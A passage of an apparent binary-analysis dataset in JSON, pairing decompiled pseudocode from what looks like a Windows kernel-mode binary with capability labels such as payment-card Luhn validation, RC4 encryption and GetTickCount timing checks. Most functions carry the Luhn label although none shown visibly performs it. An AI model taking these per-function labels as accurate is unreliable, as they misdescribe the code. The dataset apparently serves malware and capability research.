        "decompiled_code": "\nvoid fcn.00044fdc(ulong noname_0, ulong arg2)\n\n{\n    uint auStackX16 [6];\n    \n    auStackX16[0] = arg2;\n    fcn.00044a80(noname_0, 1, 0x1010e, auStackX16);\n    return;\n}\n",
        "token_count": 74
    },
    "00045078": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00045078(ulong arg1)\n\n{\n    int16_t iVar1;\n    int64_t iVar2;\n    int16_t *piVar3;\n    int64_t iVar4;\n    uint64_t arg2;\n    int32_t aiStackX16 [2];\n    uint auStackX24 [2];\n    uint auStackX32 [2];\n    uchar auStack616 [8];\n    ulong uStack608;\n    uint uStack600;\n    ushort uStack596;\n    ulong uStack592;\n    uchar auStack584 [6];\n    int16_t iStack578;\n    uchar auStack576 [24];\n    int16_t aiStack552 [256];\n    \n    arg2 = 0;\n    fcn.00031564(0x7b290, auStack616, 0);\n    iVar2 = fcn.00036bf8(arg1, 1);\n    if ((iVar2 == 0) || (*(iVar2 + 0xc) != 0)) {\n        fcn.00031598(0x7b290, auStack616, 0);\n        aiStackX16[0] = -0x3fffffff;\n    }\n    else {\n        piVar3 = iVar2 + 0x1a;\n        iVar4 = aiStack552 - piVar3;\n        do {\n            iVar1 = *piVar3;\n            *(iVar4 + piVar3) = iVar1;\n            piVar3 = piVar3 + 1;\n        } while (iVar1 != 0);\n        uStack592 = *(iVar2 + 0x460);\n        fcn.00031598(0x7b290, auStack616, 0);\n        fcn.000619f0(auStack576, aiStack552);\n        (**0x11018)(aiStackX16, auStack584, &uStack608, auStackX24, 0x66238, 2, *0x7b890, iVar2, auStack576, 0, 0);\n        if (aiStackX16[0] == 0x103) {\n            fcn.0002ee4c(&uStack592, 0xffffffff);\n            aiStackX16[0] = *(iVar2 + 0x468);\n        }\n        if (aiStackX16[0] == 0) {\n            fcn.00031564(0x7b290, auStack616, 1);\n            iVar2 = fcn.00036bf8(arg1, 1);\n            if (iVar2 != 0) {\n                *(iVar2 + 0x450) = uStack608;\n                *(iVar2 + 0x478) = 0;\n                *(iVar2 + 0x458) = auStackX24[0];\n                auStackX32[0] = *(iVar2 + 0x430);\n            }\n            fcn.00031598(0x7b290, auStack616, 1);\n            if (iVar2 == 0) {\n                aiStackX16[0] = -0x3ffffddb;\n            }\n            else {\n                aiStackX16[0] = fcn.00044a80(arg1, 1, 0x1010e, auStackX32);\n                aiStackX16[0] = fcn.00044a80(arg1, 0, 0x1010102, &uStack600);\n                fcn.00031564(0x7b290, auStack616, 1);\n                iVar2 = fcn.00036bf8(arg1, 1);\n                if (iVar2 == 0) {\n                    uStack608 = 0;\n                }\n                else {\n                    if (aiStackX16[0] == 0) {\n                        *(iVar2 + 0x14) = uStack600;\n                    }\n                    else {\n                        uStack596 = 0;\n                        *(iVar2 + 0x14) = 0;\n                    }\n                    *(iVar2 + 0x18) = uStack596;\n                    uStack608 = *(iVar2 + 0x450);\n                    arg2 = *(iVar2 + 0x47c);\n                }\n                fcn.00031598(0x7b290, auStack616, 1);\n                fcn.00044780(uStack608, arg2);\n                aiStackX16[0] = 0;\n            }\n        }\n    }\n    return aiStackX16[0];\n}\n",
        "token_count": 971
    },
    "00045c38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00045c38(void)\n\n{\n    int64_t iVar1;\n    uint32_t auStackX8 [8];\n    uchar uStack216;\n    uchar uStack215;\n    ulong uStack208;\n    ulong uStack200;\n    ulong uStack192;\n    ulong uStack184;\n    code *pcStack176;\n    ulong uStack168;\n    ulong uStack160;\n    code *pcStack152;\n    code *pcStack144;\n    code *pcStack136;\n    uchar auStack128 [24];\n    ulong uStack104;\n    ulong uStack96;\n    code *pcStack88;\n    \n    fcn.0002f814(0x14570, 0x7b880, 0x7b888);\n    fcn.00061a56(&uStack216, 0, 0xd0);\n    uStack208 = 0x44974;\n    uStack200 = 0x44a34;\n    uStack216 = 5;\n    uStack192 = 0x44938;\n    uStack215 = 0;\n    uStack184 = 0x44c50;\n    pcStack176 = fcn.0001609c;\n    uStack168 = 0x44b98;\n    uStack160 = 0x45a50;\n    pcStack152 = fcn.0001609c;\n    pcStack144 = fcn.0001609c;\n    pcStack136 = fcn.0001609c;\n    fcn.000619f0(auStack128, 0x15b70);\n    uStack96 = 0x44d40;\n    pcStack88 = fcn.0005cbfc;\n    uStack104 = 0x44d38;\n    (*_fcn.00011050)(auStackX8, 0x7b890, &uStack216, 0xd0);\n    if (auStackX8[0] == 0) {\n        (**0x11008)(auStackX8, 0x7b8a0, 100, 0x18);\n        if ((auStackX8[0] == 0) && ((**0x11010)(auStackX8, 0x7b898, 100),  auStackX8[0] == 0)) {\n            fcn.00036864(0x15b58);\n            fcn.00036864(0x15b40);\n            do {\n                iVar1 = fcn.00036bf8(auStackX8[0], 0);\n                if (iVar1 != 0) {\n                    fcn.000457e8(auStackX8[0], 1);\n                }\n                auStackX8[0] = auStackX8[0] + 1;\n            } while (auStackX8[0] < 100);\n            auStackX8[0] = 0;\n            *0x7b88c = 1;\n        }\n        else {\n            if (*0x7b8a0 != 0) {\n                (**0x110a0)();\n            }\n            if (*0x7b898 != 0) {\n                (**0x11020)();\n            }\n            (*_fcn.00011048)(auStackX8, *0x7b890);\n        }\n    }\n    return auStackX8[0];\n}\n",
        "token_count": 735
    },
    "00045e34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00045e34(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0002f718();\n    if (iVar1 < 0x1b) {\n        fcn.00048628(arg1, arg2, arg3, arg4);\n    }\n    else {\n        fcn.0003d870(arg2, arg3, arg4);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00045e80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00045e80(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    ulong in_stack_00000028;\n    \n    iVar1 = fcn.0002f718();\n    if (iVar1 < 0x1b) {\n        fcn.000484c8(arg1, arg2, arg3, arg4);\n    }\n    else {\n        fcn.0003d934(arg2, arg3, arg4, in_stack_00000028);\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "00045ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00045ef0(code *arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0002f718();\n    if ((iVar1 < 0x1b) && (arg1 != NULL)) {\n        (*arg1)(arg2, arg3, 0, 0, 0, 0, 4);\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "00045f40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00045f40(ulong noname_0, ulong arg2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0002f718();\n    if (iVar1 < 0x1b) {\n        (*_fcn.000115b0)(arg2);\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00045f64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00045f64(ulong arg1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0002f718();\n    if (iVar1 < 0x1b) {\n        fcn.0002fc50(arg1);\n    }\n    else {\n        fcn.0003bdb0(arg1);\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00046058": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00046058(void)\n\n{\n    ulong uVar1;\n    \n    *0x7b8b0 = fcn.0002fbf0(0x8000);\n    if (*0x7b8b0 == 0) {\n        uVar1 = 0xc000009a;\n    }\n    else {\n        fcn.00061a56(*0x7b8b0, 0, 0x8000);\n        *0x87c80 = 0;\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 128
    },
    "000465e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.000465e8(ulong arg1, ulong arg2, int64_t arg3, int64_t arg4)\n\n{\n    uchar uVar1;\n    uchar uVar2;\n    uchar uVar3;\n    uchar uVar4;\n    ushort uVar5;\n    ushort uVar6;\n    ulong in_stack_00000028;\n    int64_t iStack96;\n    ushort uStack88;\n    ushort uStack86;\n    ushort uStack82;\n    ushort uStack80;\n    ushort uStack78;\n    ushort uStack76;\n    ushort uStack74;\n    \n    iStack96 = *0xfffff78000000014 - *0x7b8c8;\n    fcn.00030a80(&iStack96, &uStack88);\n    uVar5 = fcn.0002fd20();\n    uVar1 = *(arg4 + 5);\n    uVar2 = *(arg4 + 4);\n    uVar3 = *(arg4 + 3);\n    uVar4 = *(arg4 + 2);\n    uVar6 = fcn.0002fd20();\n    fcn.00061b10(arg1, 0x15ba0, uStack88, uStack86, uStack82, uStack80, uStack78, uStack76, uStack74, arg2, *(arg3 + 2)\n                 , *(arg3 + 3), *(arg3 + 4), *(arg3 + 5), uVar6, uVar4, uVar3, uVar2, uVar1, uVar5, in_stack_00000028);\n    return;\n}\n",
        "token_count": 356
    },
    "00047054": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00047054(int64_t arg1, ulong arg2, ulong noname_2, ulong arg4)\n\n{\n    ulong uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong *puVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint32_t in_stack_00000028;\n    \n    pcVar5 = NULL;\n    if ((*(arg1 + 0x200) == '\\0') && (*(arg1 + 0x201) == '\\0')) {\n        iVar2 = fcn.0003fb44(arg4, in_stack_00000028, *(arg1 + 0x204) == 0);\n        if (iVar2 == 0) {\n            *(arg1 + 0x204) = *(arg1 + 0x204) + in_stack_00000028;\n            if (0x100 < *(arg1 + 0x204)) {\n                *(arg1 + 0x201) = 1;\n            }\n        }\n        else {\n            (*_fcn.000115a8)(*(arg1 + 0x30));\n            *(arg1 + 0x200) = 1;\n            pcVar6 = pcVar5;\n            if (((*(arg1 + 0x38) != 0) && (iVar3 = fcn.0004633c(*(arg1 + 0x38), 0),  iVar3 != 0)) &&\n               (pcVar5 = NULL,  pcVar6 = NULL,  *(iVar3 + 0x68) != 0)) {\n                pcVar5 = *(iVar3 + 0x68);\n                pcVar6 = *(iVar3 + 0x70);\n            }\n            puVar4 = fcn.0002fbf0(0x638);\n            if (puVar4 != NULL) {\n                *(puVar4 + 6) = iVar2;\n                puVar4[4] = *(arg1 + 0x28);\n                uVar1 = *(arg1 + 0x30);\n                *(puVar4 + 0x3c) = noname_2;\n                puVar4[5] = uVar1;\n                puVar4[8] = pcVar5;\n                *(puVar4 + 7) = arg2;\n                puVar4[9] = pcVar6;\n                puVar4[10] = *(arg1 + 0x1f8);\n                *(puVar4 + 0x634) = in_stack_00000028;\n                if (0x5dc < in_stack_00000028) {\n                    *(puVar4 + 0x634) = 0x5dc;\n                }\n                fcn.000619f6(puVar4 + 0xb, arg4, *(puVar4 + 0x634));\n                puVar4[3] = puVar4;\n                *puVar4 = 0;\n                puVar4[2] = 0x3ffe8;\n                (*_fcn.00011488)(puVar4, 1);\n                return 1;\n            }\n            (*_fcn.000115b0)(*(arg1 + 0x30));\n            *(arg1 + 0x200) = 0;\n            *(arg1 + 0x201) = 1;\n            (*pcVar5)(pcVar6, *(arg1 + 0x1f8), 0, 0, 0, 0, 2);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 775
    },
    "00047990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00047990(uint64_t arg1, int64_t arg2, ulong *arg3)\n\n{\n    int32_t *piVar1;\n    bool bVar2;\n    uint64_t uVar3;\n    uint64_t arg1_00;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    int32_t iVar7;\n    uint64_t uVar8;\n    \n    uVar6 = 0;\n    uVar8 = 0;\n    bVar2 = false;\n    iVar7 = 0;\n    *arg3 = 0;\n    arg3[1] = 0;\n    piVar1 = *(arg2 + 0x20);\n    uVar3 = uVar6;\n    arg1_00 = uVar6;\n    if (piVar1 != NULL) {\n        uVar5 = 0;\n        uVar3 = (**0x11128)(piVar1, 0x28, 0, 0, 0);\n        if (uVar3 == 0) {\n            iVar7 = -0x3fffffe9;\n        }\n        else {\n            (**0x11120)(uVar3, uVar5 & 0xffffffffffffff00 | *(arg1 + 0x40), 0);\n            bVar2 = true;\n            arg1_00 = uVar8;\n            if ((piVar1[3] == 0x100) &&\n               (((piVar1[2] == 0x100 && (piVar1[4] == 1)) ||\n                ((piVar1[2] == 0x200 && (((*piVar1 == 0x301 || (*piVar1 == 0x400)) || (*piVar1 == 0x401)))))))) {\n                while ((uVar4 = uVar6,  uVar4 < *0x7b900 &&\n                       ((*(uVar6 * 0xc + 0x7b904) != *piVar1 || (*(uVar6 * 0xc + 0x7b908) != piVar1[1]))))) {\n                    uVar6 = uVar4 + 1;\n                }\n                if ((*0x7b900 <= uVar4) ||\n                   ((((*piVar1 != 0x301 || (*(uVar6 * 0xc + 0x7b90c) == 0x303)) &&\n                     ((*piVar1 != 0x400 || (*(uVar6 * 0xc + 0x7b90c) == 0x404)))) &&\n                    ((*piVar1 != 0x401 || (*(uVar6 * 0xc + 0x7b90c) == 0x403)))))) {\n                    arg1_00 = fcn.0002fbc4(0x28);\n                    if (arg1_00 == 0) {\n                        iVar7 = -0x3fffff66;\n                    }\n                    else {\n                        arg3[1] = arg1_00;\n                        *arg3 = 0x46960;\n                        fcn.000619f6(arg1_00, *(arg2 + 0x20), 0x28);\n                    }\n                }\n            }\n        }\n    }\n    if (iVar7 != 0) {\n        fcn.0002fc50(arg1_00);\n    }\n    if (uVar3 != 0) {\n        if (bVar2) {\n            (**0x11118)(uVar3);\n        }\n        (**0x11110)(uVar3);\n    }\n    *(arg1 + 0x30) = iVar7;\n    return arg1 & 0xffffffffffffff00 | iVar7 == 0;\n}\n",
        "token_count": 813
    },
    "000484c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000484c8(ulong arg1, ulong arg2, ulong arg3, uint64_t arg4)\n\n{\n    int64_t iVar1;\n    int64_t arg2_00;\n    ulong uVar2;\n    int64_t iVar3;\n    ulong *in_stack_00000028;\n    \n    if (arg4 == 0) {\n        *in_stack_00000028 = 0;\n        uVar2 = 0;\n    }\n    else {\n        arg2_00 = (**0x114b8)(3, arg1, 0, 0, 0, 0, 1, 0, 0);\n        if (arg2_00 == 0) {\n            uVar2 = 0xc000009a;\n        }\n        else {\n            iVar3 = (**0x11128)(arg3, arg4 & 0xffffffff, 0, 0, arg2_00);\n            if (iVar3 == 0) {\n                (**0x11588)(arg2_00, 0);\n                uVar2 = 0xc000009a;\n            }\n            else {\n                (**0x11120)(iVar3, 0, 2);\n                iVar1 = *(arg2_00 + 0xb8);\n                *(iVar1 + -0x10) = 0;\n                *(iVar1 + -8) = 0;\n                *(iVar1 + -0x45) = 0;\n                iVar1 = *(arg2_00 + 0xb8);\n                *(iVar1 + -0x48) = 0xf;\n                *(iVar1 + -0x47) = 8;\n                *(iVar1 + -0x20) = arg1;\n                *(iVar1 + -0x18) = arg2;\n                *(iVar1 + -0x3c) = 0;\n                *(iVar1 + -0x40) = arg4;\n                *(arg2_00 + 8) = iVar3;\n                uVar2 = fcn.00047fe0(arg1, arg2_00, 0xf, in_stack_00000028);\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 475
    },
    "00048628": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00048628(ulong arg1, ulong arg2, ulong arg3, uint64_t arg4)\n\n{\n    int64_t iVar1;\n    int64_t arg2_00;\n    ulong uVar2;\n    int64_t iVar3;\n    \n    if (arg4 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        arg2_00 = (**0x114b8)(3, arg1, 0, 0, 0, 0, 1, 0, 0);\n        if (arg2_00 == 0) {\n            uVar2 = 0xc000009a;\n        }\n        else {\n            iVar3 = (**0x11128)(arg3, arg4 & 0xffffffff, 0, 0, arg2_00);\n            if (iVar3 == 0) {\n                (**0x11588)(arg2_00, 0);\n                uVar2 = 0xc000009a;\n            }\n            else {\n                (**0x11120)(iVar3, 0);\n                iVar1 = *(arg2_00 + 0xb8);\n                *(iVar1 + -0x10) = 0;\n                *(iVar1 + -8) = 0;\n                *(iVar1 + -0x45) = 0;\n                iVar1 = *(arg2_00 + 0xb8);\n                *(iVar1 + -0x48) = 0xf;\n                *(iVar1 + -0x47) = 7;\n                *(iVar1 + -0x20) = arg1;\n                *(iVar1 + -0x18) = arg2;\n                *(iVar1 + -0x3c) = 0;\n                *(iVar1 + -0x40) = arg4;\n                *(arg2_00 + 8) = iVar3;\n                uVar2 = fcn.00047fe0(arg1, arg2_00, 0xf, 0);\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 445
    },
    "00048770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00048770(ulong arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    int64_t arg2_00;\n    ulong uVar2;\n    \n    arg2_00 = (**0x114b8)(3, arg1, 0, 0, 0, 0, 1, 0, 0);\n    if (arg2_00 == 0) {\n        uVar2 = 0xc000009a;\n    }\n    else {\n        iVar1 = *(arg2_00 + 0xb8);\n        *(iVar1 + -0x10) = 0;\n        *(iVar1 + -8) = 0;\n        *(iVar1 + -0x45) = 0;\n        iVar1 = *(arg2_00 + 0xb8);\n        *(iVar1 + -0x48) = 0xf;\n        *(iVar1 + -0x47) = 6;\n        *(iVar1 + -0x20) = arg1;\n        *(iVar1 + -0x18) = arg2;\n        *(iVar1 + -0x40) = 4;\n        *(iVar1 + -0x38) = 0;\n        *(iVar1 + -0x30) = 0;\n        *(iVar1 + -0x28) = 0;\n        uVar2 = fcn.00047fe0(arg1, arg2_00, 0xf, 0);\n    }\n    return uVar2;\n}\n",
        "token_count": 328
    },
    "00048838": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00048838(ulong arg1)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    ulong auStackX24 [2];\n    \n    LOCK();\n    bVar2 = *0x87908 == 0;\n    *0x87908 = *0x87908 ^ bVar2 * (*0x87908 ^ 1);\n    if (!bVar2 * *0x87908 == 1) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.0002f96c(0x15c98, auStackX24);\n        if (((iVar1 == 0) && (iVar1 = fcn.0004afbc(auStackX24[0], 0x15c80, 0x7b8d8),  iVar1 == 0)) &&\n           (iVar1 = fcn.0004afbc(auStackX24[0], 0x15c68, 0x7b8e0),  iVar1 == 0)) {\n            iVar1 = fcn.00046058();\n            if (((iVar1 == 0) && (iVar1 = fcn.00016e44(0x15c50, 0x7b8e8),  iVar1 == 0)) &&\n               (iVar1 = fcn.00016d54(*0x7b8e8, 0x48180, 0),  iVar1 == 0)) {\n                fcn.00061b52(3, 0x7b8b8, 0x20, 0);\n                return 0;\n            }\n            fcn.0004813c(arg1);\n            LOCK();\n            *0x87908 = *0x87908 - 1;\n        }\n        else {\n            iVar1 = -0x3fffffff;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 416
    },
    "00049d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00049d80(int64_t arg1, uchar *arg2)\n\n{\n    ulong uVar1;\n    char acStackX16 [24];\n    \n    if (arg2 == NULL) {\n        uVar1 = 0x21590066;\n    }\n    else {\n        if (arg1 == 0) {\n            *arg2 = arg1;\n        }\n        else {\n            uVar1 = fcn.00049d34(arg1, acStackX16);\n            if (uVar1 != 0) {\n                return uVar1;\n            }\n            if (acStackX16[0] == uVar1) {\n                *arg2 = 0;\n            }\n            else {\n                *arg2 = 1;\n            }\n        }\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 183
    },
    "00049dcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00049dcc(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (arg1 == 0) {\n        fcn.000619f6(arg3, arg2, arg4);\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.0002fb84(arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 104
    },
    "00049dfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00049dfc(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (arg1 == 0) {\n        fcn.000619f6(arg2, arg3, arg4);\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.0002fba4(arg1, arg2, arg3);\n    }\n    return uVar1;\n}\n",
        "token_count": 106
    },
    "00049f00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00049f00(int64_t arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    ulong uStackX8;\n    ulong auStackX16 [3];\n    \n    auStackX16[0] = arg2;\n    if (arg1 == 0) {\n        fcn.0002fc50(arg2);\n        uVar1 = 0;\n    }\n    else {\n        uStackX8 = 0;\n        uVar1 = fcn.00061be2(arg1, auStackX16, &uStackX8, 0x8000);\n    }\n    return uVar1;\n}\n",
        "token_count": 139
    },
    "00049f40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00049f40(ulong *arg1, ulong noname_1, ulong arg3)\n\n{\n    ulong uVar1;\n    uint64_t uStack72;\n    ulong uStack64;\n    uint auStack56 [2];\n    ulong uStack48;\n    ulong uStack40;\n    uint uStack32;\n    ulong uStack24;\n    ulong uStack16;\n    \n    if (arg1 == NULL) {\n        uVar1 = 0x21590065;\n    }\n    else if (arg3 == 0) {\n        *arg1 = 0;\n        uVar1 = 0;\n    }\n    else {\n        uStack72 = arg3;\n        uStack48 = 0;\n        uStack40 = 0;\n        uStack24 = 0;\n        uStack16 = 0;\n        uStack64 = 0;\n        auStack56[0] = 0x30;\n        uStack32 = 0x200;\n        uVar1 = fcn.00061a98(arg1, noname_1, auStack56, &uStack72);\n    }\n    return uVar1;\n}\n",
        "token_count": 249
    },
    "00049fa4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00049fa4(ulong arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int32_t iVar3;\n    uint64_t uStackX16;\n    uchar auStackX24 [16];\n    ulong in_stack_ffffffffffffffa8;\n    uint uVar5;\n    uchar *puVar4;\n    uint64_t uStack72;\n    int64_t aiStack64 [2];\n    \n    uVar5 = in_stack_ffffffffffffffa8 >> 0x20;\n    fcn.00061a56(arg2, 0, 0x28);\n    piVar1 = arg2 + 0x20;\n    if (arg3 < 0x100000) {\n        arg3._0_4_ = 0x100000;\n    }\n    uStack72 = arg3;\n    *piVar1 = 0;\n    puVar4 = CONCAT44(uVar5, 0x2000);\n    iVar3 = fcn.00061bdc(arg1, piVar1, 0, &uStack72, puVar4, 4);\n    if (iVar3 == 0) {\n        uStackX16 = arg4 + 0x1000;\n        if (arg4 < 0x2000) {\n            uStackX16 = 0x2000;\n        }\n        *(arg2 + 0x10) = *piVar1 + uStack72;\n        if (uStack72 <= uStackX16) {\n            uStackX16 = uStack72 - 0x1000;\n        }\n        piVar2 = arg2 + 0x18;\n        *piVar2 = (*piVar1 + uStack72) - uStackX16;\n        puVar4 = 0x1000;\n        iVar3 = fcn.00061bdc(arg1, piVar2, 0, &uStackX16, 0x1000, 4);\n        if (iVar3 == 0) {\n            aiStack64[0] = *piVar2;\n            puVar4 = auStackX24;\n            uStackX16 = 0x1000;\n            iVar3 = fcn.0001e428(arg1, aiStack64, &uStackX16, 0x104);\n            if (iVar3 == 0) {\n                return;\n            }\n        }\n    }\n    uStackX16 = 0;\n    fcn.00061be2(arg1, piVar1, &uStackX16, 0x8000, puVar4);\n    fcn.00061a5c(iVar3);\n    return;\n}\n",
        "token_count": 595
    },
    "0004a1ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.0004a1ec(int64_t arg1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    \n    arg1 = *(arg1 + 0x3c) + arg1;\n    uVar5 = *(arg1 + 0x54);\n    uVar1 = *(arg1 + 0x38);\n    if (uVar5 % uVar1 != 0) {\n        uVar5 = (uVar5 / uVar1 + 1) * uVar1;\n    }\n    uVar3 = *(arg1 + 6);\n    if (*(arg1 + 6) != 0) {\n        puVar4 = *(arg1 + 0x14) + 0x20 + arg1;\n        do {\n            uVar2 = *puVar4;\n            if (uVar2 % uVar1 != 0) {\n                uVar2 = (uVar2 / uVar1 + 1) * uVar1;\n            }\n            uVar5 = uVar5 + uVar2;\n            puVar4 = puVar4 + 10;\n            uVar3 = uVar3 - 1;\n        } while (uVar3 != 0);\n    }\n    if (uVar5 < *(arg1 + 0x50)) {\n        uVar5 = *(arg1 + 0x50);\n    }\n    return uVar5;\n}\n",
        "token_count": 337
    },
    "0004a2e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.0004a2e4(int64_t arg1, ulong arg2, uint32_t *arg3, int64_t *arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int64_t *in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    \n    iVar4 = *(arg1 + 0x3c) + arg1;\n    uVar6 = *(iVar4 + 0x54);\n    uVar1 = *(iVar4 + 0x38);\n    if (uVar6 % uVar1 != 0) {\n        uVar6 = (uVar6 / uVar1 + 1) * uVar1;\n    }\n    uVar7 = 0;\n    iVar5 = *(iVar4 + 0x14) + 0x18 + iVar4;\n    if (*(iVar4 + 6) != 0) {\n        do {\n            iVar2 = fcn.00061bc4(iVar5, arg2, 8);\n            if (iVar2 == 0) {\n                if (arg3 != NULL) {\n                    *arg3 = uVar7;\n                }\n                if (arg4 != NULL) {\n                    *arg4 = iVar5;\n                }\n                if (in_stack_00000028 != NULL) {\n                    *in_stack_00000028 = uVar6 + arg1;\n                }\n                if (in_stack_00000030 != NULL) {\n                    uVar6 = *(iVar5 + 8);\n                    if (uVar6 % uVar1 != 0) {\n                        uVar6 = (uVar6 / uVar1 + 1) * uVar1;\n                    }\n                    *in_stack_00000030 = uVar6;\n                }\n                return 0;\n            }\n            uVar3 = *(iVar5 + 8);\n            if (uVar3 % uVar1 != 0) {\n                uVar3 = (uVar3 / uVar1 + 1) * uVar1;\n            }\n            uVar7 = uVar7 + 1;\n            uVar6 = uVar6 + uVar3;\n            iVar5 = iVar5 + 0x28;\n        } while (uVar7 < *(iVar4 + 6));\n    }\n    return 0x21590005;\n}\n",
        "token_count": 548
    },
    "0004a3d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0004a3d8(int16_t *arg1, ulong arg2)\n\n{\n    if ((((arg2 == 0) || (0x3f < arg2)) && (*arg1 == 0x5a4d)) &&\n       (((arg2 == 0 || (*(arg1 + 0x1e) + 0x108 <= arg2)) && (*(*(arg1 + 0x1e) + arg1) == 0x4550)))) {\n        return 0;\n    }\n    return 0x21590065;\n}\n",
        "token_count": 124
    },
    "0004a668": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
